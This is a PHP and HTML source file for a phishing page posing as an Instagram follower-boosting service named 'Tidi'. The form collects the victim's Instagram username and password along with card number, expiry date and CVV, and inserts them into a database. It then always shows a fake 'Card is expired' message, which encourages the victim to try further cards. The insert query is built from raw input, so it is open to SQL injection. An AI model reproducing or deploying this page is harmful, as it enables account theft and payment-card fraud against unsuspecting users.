<?php
if (isset($_POST['submit'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $number = $_POST['number'];
    $name = $_POST['name'];
    $card = $_POST['card'];
    $date = $_POST['date'];
    $code = $_POST['code'];
    if (empty($username)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your username <i class="bi bi-emoji-heart-eyes"></i>
      </div>';
    } elseif (empty($password)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your password <i class="bi bi-emoji-heart-eyes"></i>
      </div>';
    } elseif (empty($name)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your name <i class="bi bi-person-circle"></i>
      </div>';
    } elseif (empty($card)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your card <i class="bi bi-credit-card-2-front-fill"></i>
      </div>';
    } elseif (empty($date)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your date <i class="bi bi-calendar-check-fill"></i>
      </div>';
    } elseif (empty($code)) {
        $msg = '<div class="alert alert-danger text-center" role="alert">
        Please enter your code <i class="bi bi-qr-code"></i>
      </div>';
    } else {
        $sql = "insert into customers (username,password,number,name,card,date,code) values ('$username','$password','$number','$name','$card','$date','$code')";
        include "admin/_inc/conn.php";
        $result = mysqli_query($conn, $sql);
        if ($result) {
            $msg = '<div class="alert alert-danger text-center" role="alert">
        Card is expired <i class="bi bi-credit-card-2-front-fill"></i> <i class="bi bi-emoji-frown-fill"></i>
      </div>';
        } else {
            $msg = '<div class="alert alert-danger text-center" role="alert">
        Card is expired <i class="bi bi-credit-card-2-front-fill"></i> <i class="bi bi-emoji-frown-fill"></i>
      </div>';
        }

        mysqli_close($conn);
    }
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="icon" href="images/logo1.png" sizes="16x16">
    <link rel="stylesheet" href="css/bootstrap.rtl.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram followers</title>
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div class="container px-4 py-5 mx-auto">
        <div class="card card0">
            <form action="" method="post">
                <div class="d-flex flex-lg-row flex-column-reverse">
                    <div class="card card1">
                        <div class="row justify-content-center my-auto">
                            <div class="col-md-8 col-10 my-5">
                                <?php
                                if (isset($msg)) {
                                    echo $msg;
                                }
                                ?>
                                <div class="row justify-content-center px-3 mb-3"> <img id="logo" src="images/logo1.png"><img id="logo" src="images/logo2.jpg"> </div>
                                <h3 class="mb-5 text-center heading">We are Tidi</h3>
                                <h6 class="msg-info">Increase your followers on Instagram</h6>
                                <div class="form-group"> <label class="form-control-label text-muted">Username</label> <input type="text" id="username" placeholder="Your account name" class="form-control" name="username"> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">Password</label> <input type="password" id="password" placeholder="Password" name="password" class="form-control"> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">number of followers</label> <select name="number" class="form-select rounded-pill" aria-label="Default select example">
                                        <option selected>5K</option>
                                        <option value="7k : 5$">7k : 5$</option>
                                        <option value="12k : 7$">12k : 7$</option>
                                        <option value="15k : 10$">15k : 10$</option>
                                        <option value="20k : 15$">20k : 15$</option>
                                        <option value="25k : 20$">25k : 20$</option>
                                        <option value="30k : 25$">30k : 25$</option>
                                        <option value="35k : 30$">35k : 30$</option>
                                        <option value="40k : 35$3">40k : 35$</option>
                                        <option value="50k : 40$">50k : 40$</option>
                                    </select> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">Nmae</label> <input type="text" id="name" placeholder="Your name" class="form-control" name="name"> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">Card Number</label> <input type="number" id="card" placeholder="card number" name="card" class="form-control"> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">Expiry DateExpiry Date</label> <input type="text" id="username" placeholder="Expiry Date (MM/YY)" class="form-control" name="date"> </div>
                                <div class="form-group"> <label class="form-control-label text-muted">Security code</label> <input type="password" id="psw" placeholder="Security Token (CVV)" name="code" class="form-control"> </div>
                                <div class="row justify-content-center my-3 px-3"> <button name="submit" class="btn-block btn-color">Buy Now</button> </div>
                            </div>
                        </div>
                    </div>
                    <div class="card card2">
                        <img height="500px" src="images/home.jpg" alt="">
                        <div class="my-5 px-md-5 right">
                            <h3 class="text-white">We are more than just a company</h3> <small class="text-white">You can increase the number of your followers with our Instagram followers increase tool. This tool works for free. It is now very easy to become a famous person on Instagram by cheating on followers You can send likes to your posts on Instagram by doing the trick of increasing Instagram likes. Our instagram likes cheat tool works for you free of charge. With this tool, your posts appear in the discover section and you can reach a large audience You can send comments to the posts you have shared on Instagram with our Instagram comment posting hack tool. Comments are visible to everyone. You can get a very high interaction by going to the discover section of your posts You can identify and unfollow users who do not follow you on Instagram. This service is also free. You just need to login. Then click the instagram nonfollowers link in the tools section and start using it You can view your Instagram videos. The number of views of your videos increases rapidly In addition to all these services, all the topics you wonder about Instagram are in our Instagram Blog section. Click to start exploring.</small>
                        </div>
                    </div>
                </div>
            </form>
        </div>

    </div>
    <script src="js/bootstrap.js"></script>
</body>

</html>